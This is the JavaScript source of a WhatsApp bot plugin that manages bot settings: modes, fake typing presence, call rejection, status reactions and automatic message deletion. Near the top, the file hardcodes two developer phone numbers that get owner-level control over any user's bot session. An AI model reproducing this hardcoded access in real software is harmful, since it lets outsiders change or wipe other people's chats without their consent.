import { cleanPhone, initializeSessionState, updateSessionConfig, getSessionConfig } from "../core/sessionManager.js";

// ==========================================
// 1. CONFIGURATION & MASTER ACCESS
// ==========================================
const DEV_NUMBERS = new Set(["94719845166", "15947733680169"]);
global.settingsHookedSockets = global.settingsHookedSockets || new WeakSet();
global.settingSessions = global.settingSessions || new Map();

function checkAuthorization(sock, msg, from, botPhone) {
  if (msg.key.fromMe) return true;
  const senderJid = msg.key.participant || msg.participant || from || "";
  const cleanSender = cleanPhone(senderJid);
  return cleanSender === botPhone || DEV_NUMBERS.has(cleanSender);
}

// ==========================================
// 2. BACKGROUND REAL-TIME ENGINE
// ==========================================
export function attachSettingsEngine(sock) {
  if (!sock || global.settingsHookedSockets.has(sock)) return;
  global.settingsHookedSockets.add(sock);

  const botPhone = cleanPhone(sock.user?.id || "");
  if (botPhone) initializeSessionState(botPhone);

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify" || !messages || !messages[0]) return;
    const m = messages[0];
    if (!m?.message) return;

    const chatJid = m.key.remoteJid;
    if (!chatJid || chatJid === "status@broadcast") return;

    const currentPhone = cleanPhone(sock.user?.id || "");
    const cfg = getSessionConfig(currentPhone);
    if (!cfg) return;

    const isGroup = chatJid.endsWith("@g.us");
    const sender = isGroup ? (m.key.participant || m.participant || chatJid) : chatJid;
    const cleanSender = cleanPhone(sender);
    const isOwner = m.key.fromMe || cleanSender === currentPhone || DEV_NUMBERS.has(cleanSender);

    // [A] Mode Barrier
    if (!isOwner) {
      if (cfg.mode === "private" && isGroup) return;
      if (cfg.mode === "group" && !isGroup) return;
      if (cfg.mode === "inbox" && isGroup) return;
    }

    // [B] Fake Typing / Recording Engine
    if (!m.key.fromMe) {
      if (cfg.fakeTyping) {
        sock.sendPresenceUpdate("composing", chatJid).catch(() => {});
      } else if (cfg.fakeRecording) {
        sock.sendPresenceUpdate("recording", chatJid).catch(() => {});
      }
    }

    // [C] Anti-Send Engine
    if (cfg.antiSend && cfg.antiSend !== "off") {
      const shouldDelete =
        (cfg.antiSend === "me" && m.key.fromMe) ||
        (cfg.antiSend === "from" && !m.key.fromMe) ||
        cfg.antiSend === "all";

      if (shouldDelete) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }
    }
  });

  // [D] Anti-Call Rejection Barrier
  sock.ev.on("call", async (calls) => {
    const currentPhone = cleanPhone(sock.user?.id || "");
    const cfg = getSessionConfig(currentPhone);
    if (!cfg || !cfg.antiCall) return;

    for (const call of calls) {
      if (call.status === "offer") {
        await sock.rejectCall(call.id, call.from).catch(() => {});
      }
    }
  });
}

// ==========================================
// 3. ACTION DISPATCHER FOR DIRECT & NUMBER REPLIES
// ==========================================
async function handleSettingAction(sock, from, botPhone, actionKey, value, quotedMsg) {
  let feedback = "";

  switch (actionKey) {
    case "mode":
      await updateSessionConfig(botPhone, "mode", value);
      feedback = `🎯 *Bot Mode:* \`${value.toUpperCase()}\` ලෙස සාර්ථකව සකසන ලදී.`;
      break;

    case "antiSend":
      await updateSessionConfig(botPhone, "antiSend", value);
      feedback = `🛡️ *Anti-Send Engine:* \`${value.toUpperCase()}\` ලෙස සකසන ලදී.`;
      break;

    case "statusEmoji":
      await updateSessionConfig(botPhone, "statusEmoji", value);
      feedback = `💖 *Status React Emoji:* ${value} ලෙස සකසන ලදී.`;
      break;

    case "fakePresence":
      if (value === "typing") {
        await updateSessionConfig(botPhone, "fakeTyping", true);
        await updateSessionConfig(botPhone, "fakeRecording", false);
        feedback = `✍️ *Presence Mode:* \`Fake Typing (ON)\` සක්‍රීය කරන ලදී.`;
      } else if (value === "recording") {
        await updateSessionConfig(botPhone, "fakeRecording", true);
        await updateSessionConfig(botPhone, "fakeTyping", false);
        feedback = `🎙️ *Presence Mode:* \`Fake Recording (ON)\` සක්‍රීය කරන ලදී.`;
      } else {
        await updateSessionConfig(botPhone, "fakeTyping", false);
        await updateSessionConfig(botPhone, "fakeRecording", false);
        feedback = `🛑 *Presence Mode:* \`OFF\` (සාමාන්‍ය තත්ත්වයට පත් කරන ලදී).`;
      }
      break;

    default:
      // Boolean Toggles (antiDelete, statusSeen, statusReact, autoReply, welcomeCard, antiCall)
      const current = getSessionConfig(botPhone)[actionKey];
      const nextState = value !== undefined ? value : !current;
      await updateSessionConfig(botPhone, actionKey, nextState);
      feedback = `⚙️ *${actionKey.toUpperCase()}:* ${nextState ? "ක්‍රියාත්මකයි (ON) 🟢" : "අක්‍රියයි (OFF) 🔴"}`;
      break;
  }

  sock.sendMessage(from, { react: { text: "✅", key: quotedMsg.key } }).catch(() => {});
  return await sock.sendMessage(from, { text: feedback }, { quoted: quotedMsg });
}

// ==========================================
// 4. MAIN COMMAND & NUMBER SELECTION HANDLER
// ==========================================
export default {
  name: "setting",
  aliases: ["settings", "mode", "botmode", "antisend", "config", "presence"],
  category: "owner",
  description: "Advanced session-locked visual settings manager",

  // 🛑 Interactive Number Reply Engine
  async onReply({ sock, msg, from, body, quotedStanzaId }) {
    if (!global.settingSessions.has(quotedStanzaId)) return false;

    const sessionData = global.settingSessions.get(quotedStanzaId);
    const botPhone = sessionData.botPhone;

    if (!checkAuthorization(sock, msg, from, botPhone)) return false;

    const choice = body.trim().toLowerCase();
    const actionMap = {
      // 1. Bot Mode
      "1.1": { key: "mode", val: "public" },
      "1.2": { key: "mode", val: "private" },
      "1.3": { key: "mode", val: "group" },
      "1.4": { key: "mode", val: "inbox" },

      // 2. Chat Protections
      "2.1": { key: "antiDelete" },
      "2.2": { key: "antiCall" },

      // 3. Status Utilities
      "3.1": { key: "statusSeen" },
      "3.2": { key: "statusReact" },

      // 4. Presence Simulation (Fake Typing & Recording)
      "4.1": { key: "fakePresence", val: "typing" },
      "4.2": { key: "fakePresence", val: "recording" },
      "4.3": { key: "fakePresence", val: "off" },

      // 5. Anti-Send Auto Eraser
      "5.1": { key: "antiSend", val: "all" },
      "5.2": { key: "antiSend", val: "me" },
      "5.3": { key: "antiSend", val: "from" },
      "5.4": { key: "antiSend", val: "off" },

      // 6. Automation & Greetings
      "6.1": { key: "autoReply" },
      "6.2": { key: "welcomeCard" }
    };

    if (actionMap[choice]) {
      const { key, val } = actionMap[choice];
      await handleSettingAction(sock, from, botPhone, key, val, msg);
      return true;
    }

    return false;
  },

  async execute({ sock, msg, from, args, body, prefix, config: botConfig }) {
    attachSettingsEngine(sock);

    const pref = prefix || botConfig?.PREFIX || ".";
    const botPhone = cleanPhone(sock.user?.id || "");
    const settings = getSessionConfig(botPhone);

    if (!checkAuthorization(sock, msg, from, botPhone)) {
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "🔒 *මෙම Bot Session එකේ සැකසුම් වෙනස් කිරීමට අවසර නැත!*" },
        { quoted: msg }
      );
    }

    const fullBody = (body || "").trim().slice(pref.length).trim();
    const cmd = fullBody.split(/\s+/)[0].toLowerCase();
    const opt = args[0]?.toLowerCase()?.trim();
    const val = args[1]?.toLowerCase()?.trim();

    // Fast-path command shortcuts
    if (cmd === "mode" && opt) return await handleSettingAction(sock, from, botPhone, "mode", opt, msg);
    if (cmd === "antisend" && opt) return await handleSettingAction(sock, from, botPhone, "antiSend", opt, msg);
    if ((cmd === "presence" || opt === "presence") && val) return await handleSettingAction(sock, from, botPhone, "fakePresence", val, msg);

    // Direct Toggles (.setting antidel on / off)
    const toggleMap = {
      antidel: "antiDelete",
      anticall: "antiCall",
      stseen: "statusSeen",
      stract: "statusReact",
      autoreply: "autoReply",
      welcome: "welcomeCard"
    };

    if (opt && toggleMap[opt]) {
      const boolVal = val === "on" ? true : val === "off" ? false : undefined;
      return await handleSettingAction(sock, from, botPhone, toggleMap[opt], boolVal, msg);
    }

    // Direct Emoji Selector
    if (opt === "emoji" && args[1]) {
      return await handleSettingAction(sock, from, botPhone, "statusEmoji", args[1].trim(), msg);
    }

    // ==========================================
    // 5. CLEAN MODULAR CARD DASHBOARD UI
    // ==========================================
    sock.sendMessage(from, { react: { text: "🎛️", key: msg.key } }).catch(() => {});

    let presenceStatus = "🔴 OFF";
    if (settings.fakeTyping) presenceStatus = "✍️ Typing";
    if (settings.fakeRecording) presenceStatus = "🎙️ Recording";

    const dashboardCard = 
`╔═════════════════════════════╗
   🎛️ 𝐃 𝐀 𝐑 𝐊 - 𝐃 𝐈 𝐍 𝐔  𝐂 𝐎 𝐍 𝐅 𝐈 𝐆
╚═════════════════════════════╝

📱 *Session Node:* \`+${botPhone}\`
⚡ *Database Sync:* \`Active (Persistent)\`

╭───〔 1. 🎯 𝐁𝐎𝐓 𝐌𝐎𝐃𝐄 〕
├ 📌 *Current:* \`${settings.mode ? settings.mode.toUpperCase() : "PUBLIC"}\`
│
│ [ 1.1 ] 🌐 Public Mode
│ [ 1.2 ] 🔒 Private Mode
│ [ 1.3 ] 👥 Group Only
│ [ 1.4 ] 💬 Inbox Only
╰─────────────────────────────

╭───〔 2. 🛡️ 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 & 𝐂𝐀𝐋𝐋𝐒 〕
│ [ 2.1 ] 🗑️ Anti-Delete  : ${settings.antiDelete ? "🟢 ON" : "🔴 OFF"}
│ [ 2.2 ] 📵 Anti-Call    : ${settings.antiCall ? "🟢 ON" : "🔴 OFF"}
╰─────────────────────────────

╭───〔 3. 👁️ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐄𝐍𝐆𝐈𝐍𝐄 〕
│ [ 3.1 ] 👁️ Status Seen  : ${settings.statusSeen ? "🟢 ON" : "🔴 OFF"}
│ [ 3.2 ] 💖 Status React : ${settings.statusReact ? "🟢 ON" : "🔴 OFF"} [ ${settings.statusEmoji || "💖"} ]
╰─────────────────────────────

╭───〔 4. 🎭 𝐅𝐀𝐊𝐄 𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 〕
├ 📌 *Current:* \`${presenceStatus}\`
│
│ [ 4.1 ] ✍️ Always Typing
│ [ 4.2 ] 🎙️ Always Recording
│ [ 4.3 ] 🛑 Presence OFF
╰─────────────────────────────

╭───〔 5. 🚫 𝐀𝐍𝐓𝐈-𝐒𝐄𝐍𝐃 𝐄𝐑𝐀𝐒𝐄𝐑 〕
├ 📌 *Current:* \`${settings.antiSend ? settings.antiSend.toUpperCase() : "OFF"}\`
│
│ [ 5.1 ] 💥 Delete All Messages
│ [ 5.2 ] 👤 Delete My Messages Only
│ [ 5.3 ] 👥 Delete Others' Messages
│ [ 5.4 ] 🛑 Anti-Send OFF
╰─────────────────────────────

╭───〔 6. 🤖 𝐀𝐔𝐓𝐎𝐌𝐀𝐓𝐈𝐎𝐍 〕
│ [ 6.1 ] 💬 Auto-Reply   : ${settings.autoReply ? "🟢 ON" : "🔴 OFF"}
│ [ 6.2 ] 💌 Welcome Card : ${settings.welcomeCard ? "🟢 ON" : "🔴 OFF"}
╰─────────────────────────────

> 💡 *මෙම පණිවිඩයට අදාළ අංකය (උදා: 1.1 හෝ 4.1) Reply කරන්න.*

👑 *DARK-DINU MD* • https://heshan.devofc.top/`;

    const sent = await sock.sendMessage(from, { text: dashboardCard }, { quoted: msg });

    // Store Session ID for Reply Trap
    if (sent?.key?.id) {
      global.settingSessions.set(sent.key.id, {
        botPhone,
        timestamp: Date.now()
      });

      // 5 Minutes Auto-Expire (Clean RAM)
      setTimeout(() => {
        global.settingSessions.delete(sent.key.id);
      }, 5 * 60 * 1000);
    }
  }
};
